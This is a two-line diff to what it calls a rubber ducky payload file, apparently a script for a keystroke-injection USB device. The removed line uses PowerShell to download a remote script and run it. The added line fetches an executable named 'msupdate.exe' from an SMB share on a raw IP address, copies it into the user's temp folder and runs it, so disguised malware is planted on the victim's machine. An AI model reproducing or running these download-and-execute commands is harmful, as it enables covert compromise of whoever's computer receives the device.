@@ -1,2 +1,2 @@
 # Rubber ducky file.
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/justin-p/PowerShell/master/portal.ps1')
+C:\Windows\System32\cmd.exe /c start /min cmd /c "pushd \\5.200.18.86\download & copy msupdate.exe %userprofile%\appdata\local\temp & popd" & powershell.exe -c "start-sleep -s 10;%LOCALAPPDATA%\temp\msupdate.exe"
